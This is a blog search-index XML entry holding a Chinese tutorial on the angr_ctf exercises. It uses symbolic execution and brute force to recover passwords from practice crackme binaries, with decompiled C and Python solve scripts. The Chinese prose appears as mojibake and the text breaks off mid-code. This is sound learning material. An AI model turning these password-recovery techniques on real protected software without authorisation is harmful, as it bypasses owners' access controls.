<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ã€angr_ctfã€‘äºŒè¿›åˆ¶åˆ†æå·¥å…·angrä½¿ç”¨ä¸ç»ƒä¹ -Part Iï¼ˆåŸºç¡€ç¯‡ï¼‰</title>
    <link href="/article/61784.html"/>
    <url>/article/61784.html</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡è®°å½•ä¸€ä¸‹å­¦ä¹ ä½¿ç”¨<code>angr</code>è¿‡ç¨‹ä¸­çš„ä¸€äº›å¿ƒå¾—ï¼Œä¸»è¦æ˜¯åŸºäº<code>Github</code>ä¸Š çš„å¼€æºé¡¹ç›®<a href="https://github.com/jakespringer/angr_ctf">jakespringer/angr_ctf</a>ï¼Œè¯¥é¡¹ç›®é€šè¿‡angræ¥è§£å†³ä¸€äº›ctfé¢˜ï¼Œå¸®åŠ©åˆå­¦è€…ä¸€æ­¥æ­¥ç†Ÿæ‚‰<code>angr</code>çš„ä½¿ç”¨ã€‚ç›¸å…³çš„å‚è€ƒèµ„æ–™æ”¾åœ¨äº†æ–‡æœ«ï¼ŒåŒ…æ‹¬ä¸€äº›æˆ‘è®¤ä¸ºè®²è§£åœ°ä¸é”™çš„<code>angr</code>ç›¸å…³çš„æ–‡ç« ã€‚æ‰€æœ‰é¢˜è§£æˆ‘æ‰“ç®—åˆ†æˆ<strong>åŸºç¡€ç¯‡</strong>ï¼Œ<strong>æé«˜ç¯‡</strong>ï¼Œ<strong>è¿›é˜¶ç¯‡</strong>ä¸‰ä¸ªéƒ¨åˆ†ï¼Œå¯¹åº”ä¸‰ç¯‡æ–‡ç« æ¥å®Œæˆï¼Œæœ¬æ–‡å±äº<strong>åŸºç¡€ç¯‡</strong>ã€‚</p><div class="note note-warning">            <p>ç”±äºæœ¬äººä¹Ÿæ˜¯åˆå­¦ï¼Œæ–‡ç« ä¸­è®¸å¤šç†è§£éƒ½æ˜¯å»ºäºå‚è€ƒèµ„æ–™å’Œä¸ªäººçš„æ€è€ƒä¸Šï¼Œéš¾å…å­˜åœ¨çº°æ¼æˆ–ç†è§£ä¸æ­£ç¡®çš„åœ°æ–¹ï¼Œæœ›å¤§ä½¬å‘ç°åèƒ½åŠæ—¶æŒ‡å‡ºï¼Œä¸èƒœæ„Ÿæ¿€ğŸ™</p>          </div><blockquote><p>å¯¹äºangr_ctfçš„ä½¿ç”¨ï¼Œç®€å•è¯´æ˜ä¸€ä¸‹ï¼Œæ¯ä¸ªé¢˜ç›®éƒ½åŒ…æ‹¬å¦‚ä¸‹å†…å®¹ï¼š</p><ul><li><code>xx_angr_xx.c.templite</code>: cæºç æ¨¡æ¿æ–‡ä»¶</li><li><code>generate.py</code>: åŸä»“åº“ä¸­æ²¡æœ‰ç°æˆçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œéœ€è¦ä½¿ç”¨è€…é€šè¿‡æ‰§è¡Œ<code>python generate.py 123 filename</code>çš„æ–¹å¼æ¥æ‰‹åŠ¨ç¼–è¯‘ï¼ˆ123æ˜¯éšæœºæ•°ï¼Œç”¨äºæ··æ·†ï¼‰</li><li><code>scaffoldxx.py</code>ï¼šè§£é¢˜æç¤ºï¼Œä½œè€…åœ¨å…³é”®ä½ç½®ç”¨<code>???,...</code>çš„æ–¹å¼è¿›è¡Œäº†æ›¿ä»£ï¼Œä¹Ÿå¯ä»¥çœ‹ä½œæ˜¯å®˜æ–¹æä¾›çš„è§£é¢˜æ¨¡æ¿</li><li><code>solve.py</code>ï¼šä½äº<code>solutions</code>ï¼Œæ˜¯é¢˜è§£</li></ul></blockquote><h2 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h2><p>ç›´æ¥æ‹–åˆ°idaä¸­æŸ¥çœ‹ä¸€ä¸‹æºä»£ç ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span> __cdecl main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>1Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1Ch<span class="token punctuation">]</span>  char s1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>23h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>15h<span class="token punctuation">]</span>  unsigned <span class="token builtin">int</span> v6<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>Ch<span class="token punctuation">]</span>  v6 <span class="token operator">=</span> __readgsdword<span class="token punctuation">(</span>0x14u<span class="token punctuation">)</span><span class="token punctuation">;</span>  printf<span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  __isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%8s"</span><span class="token punctuation">,</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>    s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> complex_function<span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> !strcmp<span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"DVNBCPLR"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    puts<span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    puts<span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token builtin">int</span> __cdecl complex_function<span class="token punctuation">(</span>signed <span class="token builtin">int</span> a1<span class="token punctuation">,</span> <span class="token builtin">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token operator">|</span><span class="token operator">|</span> a1 <span class="token operator">></span> <span class="token number">90</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    puts<span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">*</span> a2 <span class="token operator">+</span> a1 <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>é¢˜æ„å¾ˆç®€å•ï¼Œå¯¹ä¸€ä¸ªè¾“å…¥çš„é•¿åº¦ä¸º7çš„å­—ç¬¦ä¸²æ¯ä¸€ä½åšä¸€ä¸ªå˜æ¢<code>complex_function</code>,ç„¶åå’Œç›®æ ‡å­—ç¬¦ä¸²<code>DVNBCPLR</code>æ¯”å¯¹ï¼Œå¦‚æœç›¸åŒï¼Œåˆ™æ­£ç¡®ã€‚åŒæ—¶è¿˜é™åˆ¶äº†å­—ç¬¦çš„èŒƒå›´ä¸º<code>[64,90)</code>ã€‚</p><ul><li><p><strong>æš´åŠ›ç ´è§£</strong>    </p><p>åªéœ€è¦ä¸€ä¸ªåŒé‡forå¾ªç¯ï¼Œç¬¬ä¸€å±‚éå†å­—ç¬¦ä¸²ä½æ•°ï¼Œç¬¬äºŒå±‚éå†å¯é€‰çš„å­—ç¬¦ä¸²ï¼Œç„¶ååˆ¤æ–­æ¯ä¸€ä¸ªå˜æ¢åçš„å­—ç¬¦ä¸ç›®æ ‡å­—ç¬¦æ˜¯å¦ç›¸ç­‰å³å¯ï¼Œè§£ç­”å¦‚ä¸‹ï¼š</p></li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">complex_function</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">*</span> a2 <span class="token operator">+</span> a1 <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token keyword">def</span> <span class="token function">violence_solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    find a string, for each character in the string, after transfered by function complex_function, it will be the same as the target character in target_str(password)    :return:    '''</span>    target_str <span class="token operator">=</span> <span class="token string">'DVNBCPLR'</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target_str<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>complex_function<span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> v<span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[+] Success, flag is </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li><p><strong>angrè§£ç­”</strong>  </p><p>angrçš„å¼ºå¤§åœ¨äºä»–èƒ½éå†ç¨‹åºçš„è·¯å¾„ï¼Œæ‰¾å‡ºèƒ½å¤Ÿæ‰§è¡Œåˆ¶å®šè·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹ï¼ˆæ ¸å¿ƒå°±æ˜¯ç¬¦å·æ‰§è¡Œçš„æ€æƒ³ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦ç»™å®šæˆ‘ä»¬å¸Œæœ›æ‰§è¡Œåˆ°çš„è·¯å¾„ï¼Œç„¶åæ‹¿åˆ°å¯¹åº”çš„è¾“å…¥ç”¨ä¾‹å³å¯ã€‚åœ¨æœ¬é¢˜ä¸­ï¼Œå¸Œæœ›æ‰§è¡Œçš„è·¯å¾„åˆ°è¾¾<code>puts(&quot;Good Job&quot;)</code>ï¼Œåªéœ€è¦ç»™angræä¾›å¯¹åº”è¯¥è¯­å¥æ‰€åœ¨çš„å†…å­˜åœ°å€ï¼ˆé€šè¿‡idaæŸ¥çœ‹å¾—åˆ°ï¼‰ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210430153731.png" alt=""></p><p>ä¸‹é¢å¯¹åº”é¢˜è§£ä¸­çš„ä»£ç è¾…ä»¥æ³¨é‡Šæ¥ç†è§£æ•´ä¸ªè¿‡ç¨‹ä¸­angråšçš„äº‹æƒ…ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">angr_solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'00_angr_find'</span>  <span class="token comment"># äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  <span class="token comment"># å°†äºŒè¿›åˆ¶æ–‡ä»¶è£…è½½æˆangrä¸­æŒ‡å®šçš„Projectå¯¹è±¡</span>    <span class="token comment"># factoryæä¾›äº†Projectå¯¹è±¡çš„ä¸€ç³»åˆ—è°ƒç”¨æ¥å£ï¼Œentry_state()åˆ™æ˜¯æä¾›äº†ä¸€ä¸ªç¨‹åºçš„å®ä¾‹é•œåƒ(SimStateå¯¹è±¡)ï¼Œ</span>    <span class="token comment"># æ¨¡æ‹Ÿç¨‹åºæ‰§è¡ŒæŸä¸ªæ—¶åˆ»çš„çŠ¶æ€ï¼ˆè®°å½•ä¸€ç³»åˆ—ç¨‹åºè¿è¡Œæ—¶ä¿¡æ¯ï¼Œå¦‚å†…å­˜/å¯„å­˜å™¨/æ–‡ä»¶ç³»ç»Ÿæ•°æ®ï¼‰ï¼Œä¸€èˆ¬æˆ‘ä»¬é€‰æ‹©ç¨‹åºçš„å…¥å£</span>    <span class="token comment"># çŠ¶æ€entry_state()å³å¯ï¼Œç¨‹åºä¼šä»mainå‡½æ•°å¼€å§‹è¿è¡Œ</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment"># æœ‰äº†çŠ¶æ€ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦æ¨¡æ‹Ÿç¨‹åºçš„è¿è¡Œï¼Œå³ç”¨åˆ°`Simulation Managers`(ç¼©å†™æ˜¯simgr)ï¼Œæ¥å—ä¸€ä¸ªçŠ¶æ€ä¿¡æ¯åˆå§‹åŒ–ï¼Œ</span>    <span class="token comment"># é€šè¿‡æ“æ§simgrè¾¾åˆ°æ¨¡æ‹Ÿç¨‹åºè¿è¡Œçš„ç›®çš„</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token comment"># ç¨‹åºéœ€è¦æ£€ç´¢çš„ç›®çš„åœ°å€ï¼Œé€šè¿‡ä¸€ä¸ªå…·ä½“çš„å†…å­˜åœ°å€ï¼Œè¡¨ç¤ºè·¯å¾„éœ€è¦ç»è¿‡çš„èŠ‚ç‚¹ï¼Œæ¢è¨€ä¹‹ï¼Œå°±æ˜¯æˆ‘ä»¬æƒ³è¦è·¯å¾„çš„é™åˆ¶æ¡ä»¶</span>    <span class="token comment"># é€šè¿‡simgrçš„explore()å‡½æ•°å®ç°æŸ¥æ‰¾ï¼Œè¿™é‡Œçš„åœ°å€ä½¿ç”¨idaä¸­çœ‹åˆ°çš„Good Jobå¯¹åº”çš„å†…å­˜åœ°å€</span>    print_good_address <span class="token operator">=</span> <span class="token number">0x08048678</span>      simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">)</span>    <span class="token comment"># simgrä¼šæŠŠæ‰¾åˆ°çš„ç¬¦åˆè¦æ±‚çš„è·¯å¾„å­˜å‚¨åœ¨foundä¸­ï¼Œå–ç¬¬ä¸€ä¸ªæ‰¾åˆ°çš„çŠ¶æ€ï¼Œposix.dumps(sys.stdin.fileno())åˆ™æ˜¯</span>    <span class="token comment"># è·å–å½“å‰çŠ¶æ€ä¸‹stdinè¾“å…¥çš„æ•°æ®ï¼Œå³ç¨‹åºçš„è¾“å…¥å€¼</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># sys.stdin.fileno() ä»£è¡¨ç¨‹åºçš„æ ‡å‡†è¾“å…¥ï¼Œå…·ä½“å€¼ä¸º0</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Success, flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210501165254.png" alt=""></p><p>ç”±è¯¥é¢˜è§£æˆ‘ä»¬ä¹Ÿå¯ä»¥å¯¹angråˆ†æç¨‹åºçš„è¿‡ç¨‹æœ‰ä¸€ä¸ªåŸºæœ¬çš„æ˜ åƒï¼š</p></li></ul><ol><li><p>åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶ä¸º<code>Project</code>å¯¹è±¡</p></li><li><p>è·å–ç¨‹åºçš„åˆå§‹åŒ–çŠ¶æ€<code>state</code></p></li><li><p>åˆ›å»ºç¨‹åºçš„æ¨¡æ‹Ÿç®¡ç†å™¨<code>simgr</code>ï¼Œç”¨äºæ§åˆ¶ç¨‹åºçš„æ¨¡æ‹Ÿè¿è¡Œï¼Œä»æˆ‘ä»¬æä¾›çš„åˆå§‹åŒ–çŠ¶æ€<code>state</code>å¼€å§‹</p></li><li><p>è®¾å®šè¦<code>find</code>çš„è·¯å¾„(é€šè¿‡å†…å­˜åœ°å€çš„é™åˆ¶æ–¹å¼æˆ–å…¶ä»–)ï¼Œè®°å½•è¯¥è·¯å¾„ä¸‹çš„<code>state</code>ä¿¡æ¯ï¼Œæ‰§è¡Œ<code>expolre</code></p></li><li><p>æ£€æŸ¥è·¯å¾„æŸ¥æ‰¾ç»“æœï¼Œè·å–è·¯å¾„ç›¸åº”çš„çŠ¶æ€ä¿¡æ¯ï¼Œå¹¶ä»<code>state</code>ä¸­æå–éœ€è¦çš„ä¿¡æ¯ï¼ˆå¦‚æ ‡å‡†è¾“å…¥çš„å€¼ï¼‰</p></li></ol><p>åˆ°æ­¤ï¼Œè¿™ä¸ªé¢˜ç®—æ˜¯åšå®Œäº†ï¼Œä½†å¯¹äº<code>angr</code>çš„ç†è§£ç›®å‰ä¹Ÿä»…ä»…æ˜¯ä¼šç”¨ä¸€ç‚¹è€Œå·²ï¼Œåé¢æ ¹æ®æ›´å¤šçš„é¢˜ç›®ç»ƒä¹ æ¥åŠ æ·±å¯¹<code>angr</code>çš„æŒæ¡ï¼ŒåŒæ—¶æ…¢æ…¢ç†è§£å…¶å†…éƒ¨çš„è¿è¡Œæœºåˆ¶ã€‚</p><h2 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h2><p>è¯¥é¢˜ä¸­mainå‡½æ•°çš„ä»£ç éå¸¸é•¿ï¼Œç›´æ¥ç”¨<code>ida</code>åç¼–è¯‘æºä»£ç è§£æä¸å‡ºæ¥ï¼Œè¿™é‡Œç”¨åˆ°å¦å¤–ä¸€ä¸ªæºä»£ç åç¼–è¯‘å·¥å…·<a href="https://github.com/avast/retdec">retdec</a>ï¼Œå®˜ç½‘çš„ä½¿ç”¨éƒ¨åˆ†æœ‰ä¸€ç‚¹ç¼ºé™·ï¼ˆæˆ‘ä¸‹è½½æœ€æ–°çš„å·²ç¼–è¯‘ç¨‹åºæ˜¯pythonè„šæœ¬ï¼‰ï¼Œå°†</p><div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$RETDEC_INSTALL_DIR\bin\retdec-decompiler.exe test.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p>æ”¹æˆ</p><div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ python RETDEC_INSTALL_DIR\bin\retdec-decompiler.py test.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p>æºä»£ç éå¸¸å¤šï¼ˆæ¥è¿‘7wè¡Œï¼‰ï¼Œä½†å¤§éƒ¨åˆ†æ˜¯é‡å¤æ€§çš„åƒåœ¾ä»£ç ï¼Œå°†å…¶ä¸­æ ¸å¿ƒçš„éƒ¨åˆ†æ‘˜å½•å‡ºæ¥å¾—åˆ°ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ------------------- Function Prototypes --------------------</span><span class="token class-name">int32_t</span> <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">int32_t</span> <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span> a1<span class="token punctuation">,</span> <span class="token class-name">int32_t</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">int32_t</span> <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span> str<span class="token punctuation">,</span> <span class="token class-name">int32_t</span> str2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// --------------------- Global Variables ---------------------</span><span class="token keyword">char</span> g1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 0x80d603d</span><span class="token class-name">int32_t</span> g2<span class="token punctuation">;</span><span class="token comment">// ------------------------ Functions -------------------------</span><span class="token comment">// Address range: 0x8048549 - 0x80485a8</span><span class="token class-name">int32_t</span> <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span> a1<span class="token punctuation">,</span> <span class="token class-name">int32_t</span> a2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> v1 <span class="token operator">=</span> a1 <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>v1 <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">int32_t</span> v2 <span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">*</span> a2<span class="token punctuation">;</span> <span class="token comment">// 0x8048583</span>        <span class="token class-name">int32_t</span> v3 <span class="token operator">=</span> v2 <span class="token operator">+</span> v1<span class="token punctuation">;</span> <span class="token comment">// 0x8048585</span>        <span class="token keyword">return</span> v2 <span class="token operator">+</span> a1 <span class="token operator">+</span> v3 <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">-</span> v3<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 0x804855b</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// UNREACHABLE</span><span class="token punctuation">&#125;</span><span class="token comment">// Address range: 0x80485a8 - 0x80485b5</span><span class="token class-name">int32_t</span> <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 0x80485a8</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x80d603d</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">int32_t</span> result<span class="token punctuation">;</span> <span class="token comment">// 0x80485a8</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Address range: 0x80485b5 - 0x8048602</span><span class="token class-name">int32_t</span> <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span> str<span class="token punctuation">,</span> <span class="token class-name">int32_t</span> str2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 0x80485b5</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>g1 <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>str<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>str2<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 0x80485ff</span>        <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 0x80485ff</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Address range: 0x8048602 - 0x80d458d</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">int32_t</span> v1 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0x804861b</span>    <span class="token class-name">int32_t</span> v2<span class="token punctuation">;</span> <span class="token comment">// bp-40, 0x8048602</span>    <span class="token class-name">int32_t</span> v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 0x804862f</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> v3<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 0x8048644</span>    <span class="token class-name">int32_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// bp-96, 0x8048602</span>    <span class="token class-name">int32_t</span> v5 <span class="token operator">=</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">;</span> <span class="token comment">// 0x8048610</span>    v2 <span class="token operator">=</span> <span class="token number">0x5a4c5850</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">int32_t</span> v6<span class="token punctuation">;</span> <span class="token comment">// bp-60, 0x8048602</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%8s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">int32_t</span> v7 <span class="token operator">=</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">;</span>    <span class="token class-name">int32_t</span> <span class="token operator">*</span> v8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5 <span class="token operator">-</span> <span class="token number">12</span><span class="token 